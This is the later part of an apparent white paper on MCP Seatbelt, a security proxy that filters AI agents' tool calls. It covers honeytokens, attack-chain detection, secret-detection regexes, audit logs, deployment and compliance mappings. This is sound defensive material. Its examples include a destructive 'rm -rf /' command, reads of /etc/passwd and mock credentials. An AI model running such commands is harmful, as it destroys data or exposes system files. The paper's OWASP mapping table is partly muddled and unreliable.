**Threat Intelligence IOC Reputation.** Seatbelt automatically extracts IP addresses and domain names from all string arguments and queries the ThreatFox API for known-malicious indicators of compromise (IOCs). Results are cached in-memory for 1 hour to avoid redundant API calls. Each query times out at 3 seconds to prevent upstream latency from blocking the pipeline. When a malicious indicator is detected, the call is blocked with error -32001 and the response includes the specific indicators, their types, and the source database.

The threat intel module is designed for extensibility. The current implementation uses ThreatFox; future integrations will include AlienVault OTX, MISP (Malware Information Sharing Platform), and OpenCTI for organizations that maintain their own threat intelligence platforms.

**LLM-as-Judge Semantic Analysis.** The policy engine includes an optional integration point for an LLM-based semantic judge. When enabled, tool calls that pass static policy evaluation are submitted to a configurable LLM endpoint for deeper analysis. The judge evaluates:

- **Prompt injection risk:** Does the tool name, description, or arguments contain prompt injection payloads designed to manipulate the agent or downstream model?
- **Scope creep:** Is the tool call appropriate given the declared purpose of the tool, or is the agent attempting to use a benign tool for a dangerous purpose?
- **Encoded payloads:** Are arguments encoded in base64, hex, URL-encoded, or otherwise obfuscated in ways that bypass pattern-based rules?

The judge returns a recommendation that can escalate an `allow` to `warn` or `deny`. This is an advanced feature intended for high-security environments where the additional latency (typically 500ms-2s per LLM call) is acceptable.

**Honeytoken Injection & Detection.** Seatbelt implements active deception through honeytokens — synthetic credentials that are injected into tool responses and monitored for subsequent use. The workflow is:

1. **Plant:** After DLP scanning (Stage 10), Seatbelt injects one or more decoy credentials into the response body. Each honeytoken is a valid-looking but synthetic value:
   - `AKIAIOSFODNN7EXAMPLE` (mock AWS access key)
   - `ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx` (mock GitHub token)
   - `https://hooks.slack.com/services/T00000000/B00000000/xxxxxxxxxxxx` (mock Slack webhook)
   - `postgresql://admin:honeytoken@db.internal:5432/production` (mock DB connection string)

2. **Detect:** On the next request cycle, Stage 7 scans all arguments for known honeytoken values. If a match is found, the request is blocked and an alert is raised.

3. **Alert:** Console output: `[mcp-seatbelt:honeytoken] ALERT: Honeytoken <id> (<type>) accessed by <server>!`

This provides a strong signal of exfiltration. If an attacker extracts a tool response, finds what appears to be a credential, and attempts to use it in a subsequent tool call, Seatbelt catches it — and the planted credential was never real to begin with.

**Attack Chain State Machine.** Seatbelt tracks the sequence of tool calls within each logical session using an XState finite state machine. The machine has six states:

```
     ┌──────┐  READ_SENSITIVE  ┌────────────────┐
     │      │ ────────────────▶│                │
     │ idle │                  │ reconnaissance │
     │      │◀───── 5min ──────│                │
     └──┬───┘                  └───────┬────────┘
        │                              │
        │ SHELL_EXEC          WRITE_SSH │ NETWORK_CALL
        │                              │
        ▼                              ▼
  ┌───────────┐               ┌─────────────┐
  │           │               │             │
  │ execution │──────────────▶│ persistence │
  │           │  WRITE_SYSTEM │             │
  └─────┬─────┘               └──────┬──────┘
        │                            │
        │ NETWORK_CALL      NETWORK_CALL
        │                            │
        ▼                            ▼
  ┌────────────────────┐    ┌──────────────────────┐
  │                    │    │                      │
  │ exfiltration       │◀───│ exfiltration          │
  │ _attempt           │    │ _confirmed (BLOCKED) │
  │                    │    │                      │
  └────────────────────┘    └──────────────────────┘
```

States auto-reset to `idle` after 5 minutes of inactivity, preventing false positives from legitimate work that spans sessions. The machine classifies each call based on tool name and argument patterns (e.g., `read_file` with path containing `/etc` → `READ_SENSITIVE`; any tool whose name contains `shell` or `exec` → `SHELL_EXEC`).

When `exfiltration_confirmed` is reached, Seatbelt blocks the current request and logs the attack chain. This catches the most dangerous class of MCP attacks — those that span multiple calls where each individual call might appear benign in isolation.

### 4.3 Layer 3 — Response Protection

Once the upstream server has processed the request and returned a response, Seatbelt applies post-execution protections before the response reaches the agent.

**Response DLP (Data Loss Prevention).** The `scanResponse` function performs a deep recursive scan of every string value in the upstream response, matching against six regex-based secret patterns:

1. **AWS Access Keys:** `AKIA[0-9A-Z]{16}`
2. **GitHub Personal Access Tokens:** `ghp_[0-9a-zA-Z]{36}`
3. **OpenAI API Keys:** `sk-[a-zA-Z0-9]{32,}`
4. **Private Keys (PEM):** `-----BEGIN (RSA|EC|DSA|OPENSSH)? ?PRIVATE KEY-----` blocks
5. **Generic API Keys:** `api_key=...`, `apikey=...`, `bearer ...`, `auth_token=...`
6. **Generic Secrets:** `secret=`, `password=`, `token=`, `credential=` patterns

Matched values are replaced with `[REDACTED-<type>]` placeholders. The original secret is never logged, stored, or forwarded. Redaction metadata (type and JSON path) is logged to stderr for operational visibility.

DLP is enabled by default and can be disabled with `--no-dlp` for environments where the performance cost of deep scanning is unacceptable, or where upstream servers are fully trusted.

**Forensic Session Capture.** When enabled via `--forensics` flag or `record` command, Seatbelt captures every request and response pair as a signed `.mcpcap.json` session file:

```json
{
  "sessionId": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "startedAt": 1721241600000,
  "events": [
    {
      "timestamp": 1721241600100,
      "direction": "request",
      "payload": {
        "jsonrpc": "2.0",
        "method": "tools/call",
        "params": {
          "name": "read_file",
          "arguments": { "path": "/etc/hosts" }
        },
        "id": 1
      }
    },
    {
      "timestamp": 1721241600234,
      "direction": "response",
      "payload": {
        "jsonrpc": "2.0",
        "result": {
          "content": [{ "type": "text", "text": "127.0.0.1 localhost\n" }]
        },
        "id": 1
      }
    }
  ]
}
```

These files provide a complete, timestamped record of every interaction for incident response, forensic analysis, and compliance audits. Files are written to `.mcp-seatbelt/sessions/` and named by session UUID.

### 4.4 Layer 4 — Governance

Beyond real-time enforcement, Seatbelt provides the evidentiary and operational infrastructure that enterprises need for governance, compliance, and continuous security improvement.

**Signed Audit Trail.** Every policy decision is written to a JSONL audit log with HMAC-SHA256 integrity protection. Each entry includes:

```json
{
  "_seq": 1427,
  "_hmac": "a1b2c3d4e5f6...",
  "toolName": "execute_command",
  "description": "Runs shell commands",
  "args": { "command": "rm -rf /" },
  "action": "deny",
  "timestamp": "2025-07-17T14:30:00.000Z",
  "reason": "[block-shell-execution] Block direct shell interpreter invocations",
  "context": { "client": "filesystem", "requestCount": 1427 }
}
```

The HMAC covers the sequence number concatenated with the JSON-serialized entry (excluding `_hmac` itself), chaining entries together. The `verify-audit` command reads the entire log, recomputes each HMAC, and flags any tampered entries:

```
$ mcp-seatbelt verify-audit
Audit integrity: VALID
Entries: 1427
Tampered: 0
```

Any modification to an entry — even a single character — invalidates its HMAC and is flagged. This provides tamper-evident logging suitable for compliance audits and forensic investigations.

**OWASP LLM Top 10 Mapping.** Every risk rule is mapped to one or more OWASP Top 10 for LLM Applications categories:

| OWASP ID | Category | Mapped Rules |
|----------|----------|--------------|
| LLM01 | Prompt Injection | (Via LLM judge — semantic analysis) |
| LLM02 | Sensitive Information Disclosure | `sensitive-env`, `sensitive-paths` |
| LLM03 | Training Data Poisoning | `network-transport` |
| LLM04 | Model Denial of Service | `privilege-escalation` |
| LLM05 | Supply Chain Vulnerabilities | — |
| LLM06 | Excessive Agency | `shell-interpreter`, `destructive-fs`, `no-sandbox`, `network-tool`, `docker-container`, `process-spawn` |
| LLM07 | System Prompt Leakage | — |
| LLM08 | Vector Embedding Weaknesses | `remote-access` |
| LLM09 | Supply Chain Vulnerabilities | `risky-package`, `package-runner` |
| LLM10 | Insecure Plugin Design | — |

This mapping means every blocked call in the audit log carries implicit OWASP categorization, enabling security teams to report on MCP risk posture using the same taxonomy they use for LLM application security generally.

**Compliance Framework Tagging.** Policy rules carry compliance control tags for six frameworks:

| Framework | Control Reference | Relevance to Seatbelt |
|-----------|-------------------|----------------------|
| SOC 2 | CC6.1, CC6.6, CC6.8, CC7.2 | Logical access control, security operations, change management, incident detection |
| HIPAA | 164.312(a)(1), 164.312(e)(1) | Access controls, transmission security |
| GDPR | Art. 32 | Security of processing |
| ISO 27001 | A.9.2, A.9.4 | User access management, system access control |
| PCI-DSS | 7.1, 7.2 | Access control restriction, access control system |
| NIST CSF | PR.AC, PR.PT, DE.CM | Access control, protective technology, security monitoring |

These tags are available programmatically via the `COMPLIANCE_TAXONOMY_ENTRIES` export and can be used to generate compliance reports that map Seatbelt enforcement activity to specific regulatory controls.

**Policy Regression Testing.** The `test-policy` command runs a test suite against policy rules to verify that expected blocks occur and expected allows pass through:

```bash
mcp-seatbelt test-policy --tests policy-tests.yml
```

Test files define expected behaviors:

```yaml
tests:
  - tool: execute_bash
    args: { command: "ls -la" }
    expected: deny
    rule: block-shell-execution

  - tool: read_file
    args: { path: "/workspace/config.yml" }
    expected: allow

  - tool: read_file
    args: { path: "/etc/passwd" }
    expected: deny
    rule: block-sensitive-paths
```

This enables policy-as-code workflows where policy changes are tested before deployment, preventing regressions that could either over-block legitimate tools or under-block dangerous ones.

**The `simulate` command** complements testing by showing a detailed evaluation trace for a single hypothetical call:

```
$ mcp-seatbelt simulate --tool execute_bash --args '{"command":"ls"}'
Tool: execute_bash
Action: deny
Reasons:
  [block-shell-execution] Block direct shell interpreter invocations

Rules evaluated:
  block-shell-execution: MATCHED (deny, command, pattern)
  block-sensitive-paths: not matched
  redact-credentials: not matched
  ...
```

**Hot Reload.** The proxy watches the active policy file with `fs.watch` and reloads rules automatically when the file changes. A `SIGHUP` signal also triggers a reload. This enables zero-downtime policy updates in production environments.

**Webhook Notifications.** Policy events (deny, warn, redact) trigger configurable webhook notifications to Slack, Discord, or generic JSON endpoints. Notifications include the server name, tool name, arguments, reasons, action taken, and timestamp — enabling real-time alerting integrated with existing incident response workflows.

### 4.5 Layer 5 — Operations

**Live Dashboard (:9421).** Real-time HTML dashboard showing request statistics, block rates, latency percentiles, connected clients, and the most recent blocked calls. Designed for ops teams monitoring Seatbelt in production.

**Performance Benchmarks.** The `benchmark` command measures end-to-end proxy latency:

```
$ mcp-seatbelt benchmark --requests 1000 --concurrency 10

Benchmark results (1000 requests, 10 concurrent):
  p50: 1.2ms
  p95: 3.8ms
  p99: 7.1ms
  avg: 1.4ms
  max: 12.3ms
  throughput: 847 req/s
```

Policy evaluation itself (the `evaluate()` method) is sub-millisecond in the common case. The dominant latency contributors are transport I/O (stdio process communication, HTTP round-trips) and external API calls (threat intel queries). Seatbelt's design keeps the synchronous policy evaluation path fast so that security does not become a performance bottleneck.

**Per-Call Timeouts.** Every tool call has a configurable timeout. Defaults are 30 seconds for safe tools and 10 seconds for shell execution tools, but per-rule timeout overrides allow operators to set appropriate limits for each category of tool. On timeout, the upstream process receives `SIGTERM`, then `SIGKILL` after a 2-second grace period. The agent receives a clean JSON-RPC error (`-32001`) rather than a raw connection reset or hang.

**Circuit Breaker.** After 5 consecutive upstream failures from the same server, the circuit opens for 30 seconds. During this period, all requests to that server immediately receive a 503 response without attempting to contact the upstream. After the 30-second window, the circuit transitions to half-open — the next request is a probe. If the probe succeeds, the circuit closes. If it fails, the circuit re-opens. This prevents cascading failures and gives unhealthy upstream servers time to recover.

**Rate Limiting.** IP-based rate limiting protects the proxy itself from being overwhelmed. The default limit is 100 requests per 60-second window, configurable via `--rate-limit`. Rate limit state is tracked in-memory and cleaned up on a 60-second interval.

---

## 5. Integration with mcp-observatory

MCP Seatbelt is one half of a two-tool MCP security platform. The other half is [mcp-observatory](https://github.com/KryptosAI/mcp-observatory), a pre-install static scanner that audits MCP server source code, supply chain posture, dependency risks, and exposed capabilities before an MCP server is ever connected to an agent.

### 5.1 The Combined Workflow

```
PRE-INSTALL (observatory)                  RUNTIME (seatbelt)
─────────────────────────                  ──────────────────
npx observatory scan                       npx seatbelt proxy
         │                                          │
         ▼                                          ▼
   ┌──────────────┐                        ┌──────────────┐
   │ Discover     │                        │ Intercept    │
   │ Assess Risk  │                        │ Evaluate     │
   │ Score (0-100)│                        │ Allow/Deny   │
   │ Attack Sim   │                        │ Redact Args  │
   │ SARIF Report │                        │ Audit Log    │
   └──────┬───────┘                        └──────┬───────┘
          │                                       │
          ▼                                       ▼
  observatory findings ──────────────▶ seatbelt policy rules
          │                                       │
          ▼                                       ▼
  Safety Index (public)                  Dashboard (live)
```

### 5.2 Scan → Policy Conversion

The `import-observatory` command converts observatory security findings directly into Seatbelt policy rules:

```bash
mcp-seatbelt import-observatory .mcp-observatory/runs/latest.json
```

The conversion is intelligent and preserves the semantics of observatory's findings:

- Observatory **tool findings** (dangerous capabilities) → Seatbelt `command` target rules with `deny` action
- Observatory **path findings** (sensitive file access) → Seatbelt `file` target rules with `deny` action
- Observatory **network/host findings** (untrusted endpoints) → Seatbelt `network` target rules with `deny` action
- Observatory **env/credential findings** (exposed secrets) → Seatbelt `env` target rules with `warn` or `redact` action
- Severity mapping: `critical` → `deny`, `high` → `deny`, `medium` → `warn`, `low` → `allow`

The `mergeObservatoryPolicy` function merges imported rules into an existing policy without overwriting custom rules, enabling incremental adoption.

Seatbelt automatically discovers observatory artifacts in `.mcp-observatory/runs/` and `.mcp-observatory-metrics/` directories. Running `import-observatory` with no arguments finds the latest scan results automatically.

### 5.3 Policy → Enforce

Once imported, observatory-derived rules are evaluated alongside hand-written rules by the same policy engine. A server that observatory flagged as "exposes shell execution with no sandboxing" becomes a `deny` rule that blocks every `execute_command` call at runtime — closing the loop from static analysis to live enforcement.

### 5.4 Audit → Verify

Observatory's telemetry dashboard shows ecosystem-wide safety trends: which servers are risky, where vulnerabilities cluster, what attack surfaces dominate. Seatbelt's audit log shows what *your agents actually did*: which tools were called, what was blocked, what was redacted. Together they provide:

- **Pre-install risk posture:** What's the safety score of every MCP server in our portfolio?
- **Runtime enforcement effectiveness:** What percentage of tool calls are blocked? Which rules fire most often?
- **Incident forensics:** When a security event occurs, trace every tool call the agent made in the minutes before and after.

### 5.5 Unified CI/CD Pipeline

```
CI Pipeline:
  1. npx observatory scan        → SARIF report uploaded to GitHub Code Scanning
  2. npx observatory score       → safety index gates deployment (fail if score < 60)
  3. npx seatbelt import-observatory    → convert findings to policy rules
  4. npx seatbelt check          → exit non-zero if critical risks detected
  5. npx seatbelt test-policy    → verify policy rules don't regress
  6. npx seatbelt proxy          → runtime enforcement in staging/production
```

This pipeline ensures that every MCP server is scanned before installation, its findings are converted to enforceable policy, the policy is tested for regressions, and runtime enforcement is active before the agent ever makes its first call.

---

## 6. Deployment Models

### 6.1 Local Development

The simplest deployment. A developer runs Seatbelt on their workstation to protect their AI coding agent during daily work.

```bash
npx @kryptosai/mcp-seatbelt init     # detect configs, generate policy
npx @kryptosai/mcp-seatbelt proxy    # start proxy on localhost:9420
npx @kryptosai/mcp-seatbelt dashboard # view live stats at :9421
```

The developer updates each client's MCP configuration to point to `http://localhost:9420/<server-name>` instead of directly to the MCP server. The proxy runs in `audit` mode by default — observe actual tool usage before switching to `enforce`.

### 6.2 CI/CD Integration

Seatbelt runs in CI to validate that MCP configurations and policies are correct before deployment:

```yaml
# .github/workflows/mcp-security.yml
name: MCP Security Check
on: [push, pull_request]
jobs:
  seatbelt:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '22'
      - run: npx @kryptosai/mcp-seatbelt@latest check
      - run: npx @kryptosai/mcp-seatbelt@latest test-policy
      - run: npx @kryptosai/mcp-seatbelt@latest report --sarif > seatbelt.sarif
      - uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: seatbelt.sarif
```

The `check` command exits non-zero when critical risk rules fire, failing the build. The `test-policy` command runs regression tests against the policy. SARIF output integrates with GitHub Code Scanning, GitLab SAST, and other SARIF-compatible tools — risk flags appear as code scanning alerts with rule IDs, severity levels, and descriptions.

### 6.3 Production Container

For staging and production environments, Seatbelt runs as a Docker container:

```bash
docker run -d \
  --name mcp-seatbelt \
  --restart unless-stopped \
  -p 9420:9420 \
  -p 9421:9421 \
  -v $(pwd)/.mcp-seatbelt:/app/.mcp-seatbelt \
  -e SEATBELT_API_KEY="prod-secret-key" \
  ghcr.io/kryptosai/mcp-seatbelt:latest proxy
```

The container is based on `node:22-alpine`, weighs approximately 180MB, and exposes ports 9420 (proxy) and 9421 (dashboard). Policy files are mounted from the host at `/app/.mcp-seatbelt`. Images are published to GitHub Container Registry on every release with versioned tags (`latest`, `v0.4.0`).

As a systemd service:

```ini
[Unit]
Description=MCP Seatbelt Security Proxy
After=network.target

[Service]
Type=simple
User=mcp-seatbelt
ExecStart=/usr/bin/docker run --rm --name mcp-seatbelt \
  -p 9420:9420 -p 9421:9421 \
  -v /etc/mcp-seatbelt:/app/.mcp-seatbelt \
  ghcr.io/kryptosai/mcp-seatbelt:latest proxy
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

### 6.4 Enterprise Deployment

For organizations with multiple development teams and centralized security operations:

```
                     ┌─────────────────────┐
                     │    Load Balancer    │
                     │   (HAProxy / NLB)   │
                     └────────┬────────────┘
                              │
              ┌───────────────┼───────────────┐
              │               │               │
     ┌────────▼──────┐ ┌──────▼──────┐ ┌──────▼──────┐
     │ Seatbelt #1   │ │ Seatbelt #2 │ │ Seatbelt #3 │
     │ :9420 :9421   │ │ :9420 :9421 │ │ :9420 :9421 │
     └───────┬───────┘ └──────┬──────┘ └──────┬──────┘
             │                │               │
             └────────────────┼───────────────┘
                              │
                     ┌────────▼──────┐
                     │    Redis       │
                     │ (rate limits,  │
                     │  shared state) │
                     └────────┬──────┘
                              │
                     ┌────────▼──────┐
                     │ Central Audit  │
                     │ Log Aggregator │
                     │ (ELK / Loki /  │
                     │  Splunk)       │
                     └───────────────┘
```

- **Multiple Seatbelt instances** behind a Layer 4 load balancer (HAProxy, AWS NLB) provide horizontal scaling and high availability
- **Shared Redis** for distributed rate limiting and circuit breaker state
- **Central audit log aggregation** via ELK, Grafana Loki, or Splunk for cross-instance querying
- **Policy-as-code** in version-controlled YAML, deployed with the same CI/CD pipeline as application code
- **LDAP/OIDC integration** for per-team, per-role policy assignment (roadmap)
- **Prometheus metrics endpoint** for integration with existing monitoring stacks (roadmap)

### 6.5 Air-Gapped Deployment

For environments with no external network access:

```bash
# Build once with all dependencies, transfer the image
docker build -t mcp-seatbelt:airgap .
docker save mcp-seatbelt:airgap | gzip > seatbelt.tar.gz

# On air-gapped host
docker load < seatbelt.tar.gz
docker run -d \
  -p 9420:9420 -p 9421:9421 \
  -v /secure/policy:/app/.mcp-seatbelt \
  mcp-seatbelt:airgap proxy --no-threat-intel --no-dashboard-external
```

All core functionality works without external connectivity:
- Policy engine, schema validation, path safety, RBAC — fully local
- Threat intel — gracefully disabled; no external API calls
- DLP, honeytokens, attack chains, forensics — fully local
- Dashboard — localhost-only by default
- Audit trail — local filesystem; forward to air-gapped log aggregator

### 6.6 Pricing & Licensing

MCP Seatbelt is **open-source (MIT license)** and **free forever** for all features described in this document. There are no paid tiers, no enterprise-only features, and no usage limits.

**Support & Services:** Enterprise support, hosted observatory cloud, and professional services are available separately through [KryptosAI](https://github.com/KryptosAI). Contact william@banksey.com for details.

### 6.7 Performance & Sizing

**Benchmark results** (measured on Node.js 22, macOS, Apple M-series, single-process):

| Metric | Value | Notes |
|---|---|---|
| Throughput | ~850 req/s | Tool-call evaluation (allow path, 10 rules) |
| Policy evaluation latency (p50) | 1.2ms | Single-rule match |
| Policy evaluation latency (p95) | 3.8ms | Multi-rule evaluation |
| Policy evaluation latency (p99) | 8.1ms | Full rule set + arg scoping |
| DLP scanning overhead | +0.3ms | Per-response, 6 regex patterns |
| Schema validation overhead | +0.5ms | Per-request, AJV compiled validator |
| Threat intel lookup | <3s | ThreatFox API, cached after first query |
| Memory baseline | ~45MB | Idle proxy, no registered servers |
| Memory per server | +5-15MB | Per registered upstream (stdio child process) |

**Sizing guidelines:**

| Deployment | Servers | Expected Throughput | Recommended |
|---|---|---|---|
| Developer workstation | 1-5 | <100 req/s | 1 CPU, 256MB RAM |
| Team CI/CD | 5-15 | 100-500 req/s | 2 CPU, 512MB RAM |
| Production | 15-50 | 500-2000 req/s | 4 CPU, 1GB RAM |
| Enterprise | 50+ | 2000+ req/s | 8 CPU, 2GB RAM, Redis for rate limiting, load-balanced instances |

---

## 7. Security Model

### 7.1 What Seatbelt Protects Against

| Threat | Mechanism | Stage |
|--------|-----------|-------|
| Tool poisoning (malicious server advertising benign tools) | Policy engine matches on tool name + description | 4 |
| Credential exfiltration via tool arguments | Redact rules, DLP argument scanning | 4, 10 |
| Path traversal attacks | Path safety validation | 3 |
| Shell injection in tool arguments | Policy engine pattern matching, arg constraints | 4 |
| Multi-step attack chains | XState state machine tracking call sequences | 8 |
| Upstream secrets leaking through responses | Response DLP deep-scanning | 10 |
| Unauthorized agent access to tools | RBAC per agent identity | 5 |
| Known-malicious IPs/domains in arguments | Threat intel IOC lookup | 6 |
| Honeytoken credential reuse (exfiltration signal) | Honeytoken injection + detection loop | 7, 11 |
| Malformed requests that bypass simple checks | AJV schema validation | 2 |
| Hung/runaway tool calls DoSing the proxy | Per-call timeouts with SIGKILL | 9 |
| Upstream cascading failures | Circuit breaker | 9 |
| Audit log tampering | HMAC-SHA256 signed JSONL | 12 |

### 7.2 What Seatbelt Does NOT Protect Against

Seatbelt is an application-layer (L7) proxy. It does not provide:

- **Network-layer DDoS protection.** Seatbelt's rate limiting helps, but a volumetric attack below the IP layer is outside its scope. Deploy behind a network firewall or cloud WAF for volumetric protection.
- **Transport-layer encryption.** Seatbelt does not terminate TLS (though it can proxy to HTTPS upstreams). In production, front it with a reverse proxy (nginx, Caddy) that handles TLS termination.
- **Compromised host OS.** If an attacker has root on the machine running Seatbelt, they can bypass the proxy entirely, modify the policy file, or kill the process. Seatbelt assumes a trusted host.
- **Vulnerabilities in the upstream MCP server itself.** Seatbelt validates arguments and blocks dangerous calls, but it cannot prevent an allowed call from exploiting a buffer overflow or injection vulnerability in the upstream server's implementation.
- **Social engineering of the human operator.** If an attacker convinces the operator to add an overly permissive allowlist rule, Seatbelt will enforce that rule as written. Policy is human-authored and human-maintained.
- **Compromise of the MCP agent/host application.** If Cursor or Claude Desktop is compromised at the application level, Seatbelt cannot distinguish malicious tool calls from legitimate ones — both arrive via the same JSON-RPC channel. This is a trust boundary: Seatbelt trusts that the agent faithfully represents the user's intent.

### 7.3 Trust Boundaries

```
┌────────────────────────────────────────────────────────────────┐
│                        TRUSTED ZONE                            │
│                                                                │
│  ┌──────────┐     ┌──────────────┐     ┌──────────────────┐    │
│  │  Agent   │────▶│   Seatbelt   │────▶│  MCP Server      │    │
│  │ (trusted)│     │   (trusted)  │     │  (UNTRUSTED)     │    │
│  └──────────┘     └──────────────┘     └──────────────────┘    │
│                          │                                      │
│                          ▼                                      │
│                   ┌──────────────┐                              │
│                   │ Policy File  │                              │
│                   │  (trusted)   │                              │
│                   └──────────────┘                              │
│                          │                                      │
│                          ▼                                      │
│                   ┌──────────────┐                              │
│                   │ Audit Trail  │                              │
│                   │  (trusted)   │                              │
│                   └──────────────┘                              │
│                                                                │
│  Trust boundary: Seatbelt ↔ MCP Server                         │
│  - All data from the server is untrusted                       │
│  - Responses are DLP-scanned before reaching the agent          │
│  - Server cannot access policy, audit trail, or proxy internals │
└────────────────────────────────────────────────────────────────┘
```

### 7.4 Threat Model (STRIDE)

| Category | Threat | Mitigation |
|----------|--------|------------|
| **Spoofing** | Attacker impersonates a legitimate agent | API key auth (Stage 1), RBAC agent identity (Stage 5) |
| **Tampering** | Policy file modified by unauthorized user | File permissions, policy validation on load, signed audit trail |
| **Repudiation** | Agent denies making a blocked call | Signed audit trail with HMAC-chained entries |
| **Information Disclosure** | Secrets leak through tool responses | Response DLP (Stage 10), redact rules (Stage 4) |
| **Denial of Service** | Malicious server hangs indefinitely | Per-call timeouts (Stage 9), circuit breaker (Stage 9) |
| **Elevation of Privilege** | Agent accesses tools beyond its role | RBAC (Stage 5), arg constraints, allowlist |

### 7.5 Attack Surface of the Proxy Itself

Seatbelt's own attack surface is intentionally minimal:

- **Express HTTP server** on ports 9420 and 9421 — the primary attack surface. Accepts JSON-RPC 2.0 requests only. Body size limited to 5MB. Validates `jsonrpc: "2.0"` header on every request.
- **Child process management** — StdioClient spawns and kills processes. Uses `spawn()` directly (not `exec()`), avoiding shell injection in the proxy itself.
- **File I/O** — Policy files are read with `readFile` from fixed paths. Session captures are written to `.mcp-seatbelt/sessions/`. No user-controlled paths are used for file operations.
- **External HTTP calls** — Threat intel module calls `threatfox-api.abuse.ch` with query parameters extracted from tool arguments (IPs/domains only, never credentials).
- **No persistent storage** — All state is in-memory except the audit trail (append-only JSONL) and session captures (opt-in).
- **No inbound network connections from MCP servers** — The proxy initiates all connections to upstream servers. Upstream servers cannot connect back to the proxy.

Seatbelt has not undergone a third-party security audit as of version 0.4.0. Organizations with critical security requirements should conduct their own audit before deploying in high-security environments.

---

## 8. Compliance & Standards

### 8.1 SOC 2 Trust Services Criteria

| Criterion | Description | How Seatbelt Addresses It |
|-----------|-------------|---------------------------|
| **CC6.1** | Logical and physical access controls | RBAC per agent identity; API key authentication; policy-enforced tool access |
| **CC6.6** | Security operations — monitoring and response | Live dashboard; webhook notifications; honeytoken alerts; attack chain detection |
| **CC6.8** | Change management — authorized changes | Policy-as-code in version control; test-policy regression tests; hot reload with audit trail |
| **CC7.2** | System incident detection | Signed audit trail; forensic session capture; attack chain state machine alerts |

### 8.2 HIPAA Security Rule

| Provision | Description | How Seatbelt Addresses It |
|-----------|-------------|---------------------------|
| **164.312(a)(1)** | Access controls — unique user ID, emergency access | RBAC per agent identity with unique agent IDs; admin override role |
| **164.312(e)(1)** | Transmission security — integrity controls, encryption | HMAC-signed audit trail for integrity; TLS via reverse proxy for transport encryption |

### 8.3 GDPR Article 32 (Security of Processing)

Seatbelt supports GDPR compliance through:
- **Pseudonymization:** Redact rules and response DLP automatically strip personal data from tool arguments and responses
- **Confidentiality:** API key authentication; RBAC limiting which agents can access which tools
- **Resilience:** Circuit breaker and timeouts prevent cascading failures
- **Regular testing:** `test-policy` and `fuzz` commands provide ongoing policy effectiveness verification
- **Auditability:** Signed, tamper-evident audit trail with queryable entries

### 8.4 ISO 27001

| Control | Description | How Seatbelt Addresses It |
|---------|-------------|---------------------------|
| **A.9.2** | User access management | RBAC with casbin; per-agent tool authorization |
| **A.9.4** | System and application access control | Policy engine evaluating every tool call; allowlist/denylist |

### 8.5 PCI-DSS

| Requirement | Description | How Seatbelt Addresses It |
|-------------|-------------|---------------------------|
| **7.1** | Limit access to system components by need to know | RBAC scoping and arg constraints limit access to cardholder data paths |
| **7.2** | Access control system that restricts access based on need to know | Policy engine with default-deny mode; allowlist for known-safe tools |

### 8.6 OWASP LLM Top 10 for LLM Applications

Seatbelt maps all 13 risk rules to OWASP LLM categories (see Section 4.4 for the full mapping table). Every blocked call in the audit trail carries an OWASP category, enabling security teams to report on MCP security posture using the industry-standard taxonomy for LLM application risks. The `OWASP_LLM_TAXONOMY_ENTRIES` export provides the full taxonomy for programmatic use.

---

## 9. Roadmap to the Vision

This white paper describes the full vision of what MCP Seatbelt should be. The following table distinguishes what exists today (version 0.4.0) from what is planned.

### 9.1 What Exists Today

- [x] **12-stage defense-in-depth pipeline** (auth → schema → path safety → policy → RBAC → threat intel → honeytoken detection → attack chains → timeout gate → proxy → DLP → honeytoken injection → forensic capture)
- [x] **Policy engine** with allow/deny/warn/redact actions, regex/exact/contains matching, time-windowed rules, context conditions, and per-argument capability scoping (arg constraints)
- [x] **13 built-in risk rules** covering shell interpreters, sandbox bypass, credential exposure, network tools, process spawning, destructive filesystem operations, remote access, Docker privileged containers, risky packages, privilege escalation, and sensitive paths
- [x] **8 client detectors** — Cursor, Claude Desktop, ChatGPT Desktop, VS Code, Codex, Windsurf, JetBrains IDEs, and project-local configs
- [x] **4 transport types** — stdio, HTTP, SSE, and streamable HTTP with uniform interface
- [x] **Response DLP** — 6 secret patterns (AWS, GitHub, OpenAI, private keys, API keys, generic secrets) with deep recursive scanning
- [x] **Per-call timeouts** — SIGTERM → 2s → SIGKILL; configurable per rule
- [x] **Circuit breaker** — 5 consecutive failures → 30s open
- [x] **Rate limiting** — IP-based, configurable max per 60s window
- [x] **Signed audit trail** — HMAC-SHA256 chained JSONL with verify-audit command
- [x] **Forensic session capture** — `.mcpcap.json` files with complete request/response recording
- [x] **Attack chain detection** — XState state machine (idle → recon → execution → persistence → exfiltration)
- [x] **Honeytoken injection and detection** — 6 credential types; plant → detect → alert loop
- [x] **Threat intelligence** — ThreatFox IOC lookup with 1-hour cache
- [x] **OWASP LLM Top 10 mapping** — 13 risk rules → OWASP categories
- [x] **Compliance framework tagging** — SOC2, HIPAA, GDPR, ISO 27001, PCI-DSS, NIST
- [x] **Schema validation** — AJV-based JSON Schema validation with path safety checks
- [x] **RBAC** — Casbin per-agent role-based access control
- [x] **Behavioral baseline** — Anomaly detection for new arguments, size anomalies, hour anomalies
- [x] **Input fuzzing** — `json-schema-faker` + edge-case payload generation
- [x] **Policy regression testing** — `simulate` and `test-policy` commands
- [x] **Live dashboard** — Real-time HTML dashboard on port 9421
- [x] **SARIF 2.1.0 export** — GitHub Code Scanning integration
- [x] **mcp-observatory bridge** — `import-observatory` and `mergeObservatoryPolicy`
- [x] **Hot reload** — fs.watch + SIGHUP policy reloading
- [x] **Webhook notifications** — Slack, Discord, JSON webhook support
- [x] **Docker deployment** — ghcr.io/kryptosai/mcp-seatbelt
- [x] **485 tests** across 18 test suites
- [x] **Policy template inheritance** — `extends` mechanism for composable policies
- [x] **LLM-as-judge integration point** — Optional semantic analysis for prompt injection, scope creep, encoded payloads

### 9.2 What Is Planned

- [ ] **Policy diff and migration tooling** — Semantic comparison of policy versions; assisted migration between policy formats
- [ ] **Prometheus `/metrics` endpoint** — Native Prometheus metrics for integration with Grafana, Datadog, and existing observability stacks
- [ ] **OPA/Rego policy integration** — Support for Open Policy Agent Rego policies alongside native YAML rules for organizations standardized on OPA
- [ ] **Per-tool granularity** — Allow tool A but deny tool B on the same MCP server (currently policy applies at the tool-name level across all servers)
